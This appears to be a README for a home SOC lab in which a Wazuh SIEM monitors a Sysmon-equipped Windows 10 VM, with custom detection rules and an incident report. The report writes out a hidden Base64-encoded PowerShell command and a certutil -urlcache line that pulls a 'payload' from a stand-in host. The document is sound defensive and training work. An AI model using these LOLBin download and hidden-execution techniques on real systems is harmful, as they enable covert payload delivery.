# Home SOC Lab: Wazuh SIEM & Windows Threat Detection

## 1. Overview
This project demonstrates an end-to-end local Security Operations Center (SOC) lab built to practice log ingestion, telemetry enrichment, attack simulation, detection engineering, and incident response.

The environment consists of a containerized Wazuh SIEM server monitoring an isolated Windows 10 endpoint enhanced with Sysmon, simulating real-world techniques mapped to the **MITRE ATT&CK** framework.

---

## 2. Architecture & Tech Stack

### Infrastructure Topology
* **Network Bridge:** Isolated NAT virtual network (`virbr0` - `192.168.122.0/24`)
* **SIEM Server (Host):** `192.168.122.1` (ports `1514/tcp` for agent log ingestion, `1515/tcp` for enrollment, `443/tcp` for Wazuh Dashboard
* **Monitored Endpoint (VM):** `Win10-Target` (`192.168.122.x`)

  *pic*


### Tech Stack
* **Host OS (Attacking Machine) & Hypervisor:** Arch Linux, QEMU/KVM (`libvirt` / `virt-manager`)
* **Containerization:** Docker & Docker Compose (Single-node Wazuh deployment)
* **SIEM / XDR:** Wazuh v4.14.10 (Manager, Indexer, Dashboard)
* **Monitored Endpoint:** Windows 10 Pro (VirtIO storage & drivers, 2 vCPU, 4 GB RAM)
* **Endpoint Telemetry:** Microsoft Sysmon v15.22 (configured with `SwiftOnSecurity/sysmon-config`), Windows Security Event Logs
* **Attack Simulation Tools:** Nmap, THC-Hydra, native Windows LOLBins (`powershell.exe`, `certutil.exe`, `reg.exe`)


---


## 3. Lab Deployment & Telemetry Setup

### 3.1 Wazuh SIEM Deployment (Docker)
The Wazuh single-node stack was deployed via Docker Compose with self-signed TLS cert-s generated with `generate-indexer-certs.yml`:
* `wazuh.manager` - log parsing, decoding, and rule evaluation engine
* `wazuh.indexer` - log storage and indexing
* `wazuh.dashboard` - web UI for alert triage and visualization

### 3.2 Endpoint Telemetry Enrichment (Sysmon)
To overcome the visibility gaps of default Windows logs (full command-line args, parent-child process trees, and network connections per process), MS Sysmon was installed on `Win10-Target` using the `SwiftOnSecurity` config baseline:

```powershell
Sysmon64.exe -accepteula -i sysmonconfig-swift.xml
```

### 3.3 Wazuh Agent Configuration
The Wazuh Agent was registered with the manager at 192.168.122.1 and configured to ingest the Sysmon operational event channel by appending the following XML block to `C:\Program Files (x86)\ossec-agent\ossec.conf`:
```xml
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```
#### Verification

<img width="3058" height="1118" alt="image" src="https://github.com/user-attachments/assets/5a3f2f4f-9458-4f0a-857e-bb03ccdcb145" />


---


## 4. Detection Engineering (Custom Rules)


To detect living-off-the-land binaries (LOLBins) and obfuscated execution chains at process creation time, custom rules were implemented in `/var/ossec/etc/rules/local_rules.xml` on the Wazuh Manager:

```xml
<group name="local,sysmon,windows,">

  <rule id="100100" level="12">
    <if_sid>61603,92057</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)powershell\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(-enc|-EncodedCommand)</field>
    <description>Sysmon: Obfuscated PowerShell execution via EncodedCommand detected</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
  </rule>

  <rule id="100101" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)-urlcache</field>
    <description>Sysmon: Potential Ingress Tool Transfer via certutil.exe (-urlcache)</description>
    <mitre>
      <id>T1105</id>
    </mitre>
  </rule>

</group>
```

### Verification

<img width="2398" height="1332" alt="image" src="https://github.com/user-attachments/assets/ffb2217d-ff52-4984-a274-ea18bb0dabaa" />

---


## 5. Attack Scenarios & Incident Reports


| # | Scenario | MITRE ATT&CK Technique | Detection Source | Status |
| :--- | :--- | :--- | :--- | :--- |
| 1 | Obfuscated PowerShell & LOLBin Execution | `T1059.001`, `T1105` | Sysmon (`Event ID 1`) + Custom Rules | Completed |
| 2 | Network Reconnaissance & RDP/SMB Brute Force | `T1046`, `T1110` | Windows Security Log (`4625`) | Planned |
| 3 | Registry Run Key Persistence | `T1547.001` | Sysmon (`Event ID 13`) | Planned |


### Incident Report #01: Obfuscated PowerShell & LOLBin Execution (T1059.001, T1105)


* **Triggered Rules:** `100100` (Level 12) & `100101` (Level 12)
* **Attack Simulation:**
  1. Executed Base64-encoded PowerShell payload (`whoami; hostname`) with -WindowStyle Hidden (T1059.001).
  2. Executed `certutil.exe -urlcache -split -f` to pull a remote payload into `C:\Temp\test_payload.html` (T1105).
* **Telemetry & Forensic Artifacts (Sysmon Event ID 1):**
  * Parent Process: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  * Child Process 1: `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand dwBoAG8AYQBtAGkAOwAgAGgAbwBzAHQAbgBhAG0AZQA=`
  * Child Process 2: `"C:\Windows\system32\certutil.exe" -urlcache -split -f http://example.com/ C:\Temp\test_payload.html`
* **Triage & Containment Actions:**
    1. Decoded the Base64 payload (`UTF-16LE`) to confirm command intent (`whoami; hostname`).
    2. Verified file creation events (`Sysmon Event ID 11`) in `C:\Temp` and removed the dropped artifact (`test_payload.html`).
    3. Recommended enforcing PowerShell Constrained Language Mode (CLM) and restricting outbound HTTP/HTTPS access for `certutil.exe` via Windows Defender Firewall.

#### Evidence (Wazuh Telemetry)

<img width="2434" height="1014" alt="image" src="https://github.com/user-attachments/assets/37d25362-27f4-4eb4-bd72-0b863d778e7e" />

#### Key Takeaways & Lessons Learned
- **Why Sysmon is Essential:** Standard Windows Security logs record *which* program started, but usually miss *how* it was launched. Sysmon (`Event ID 1`) fills this gap by logging full command-line arguments (such as `-EncodedCommand` or `-urlcache`), file hashes, and parent-child process relationships, making triage much faster.
- **How Wazuh Rule Inheritance Works:** Wazuh evaluates rules in a tree structure from general to specific. When a more specific built-in rule matches an event first (for example, rule `92057` for PowerShell spawning another encoded PowerShell), generic parent rules (`61603`) are bypassed. To catch both direct and nested executions, custom rules must inherit from both parent IDs (`<if_sid>61603,92057</if_sid>`).
- **Handling False Positives (Alert Triage):** During testing, PowerShell's normal background policy checks (`__PSScriptPolicyTest_*.ps1` created in `AppData\Local\Temp`) triggered built-in high-severity alerts (rule `92213`, Level 15). Investigating these events showed how legitimate OS behavior can create alert noise and why baseline tuning is critical in a real SOC.
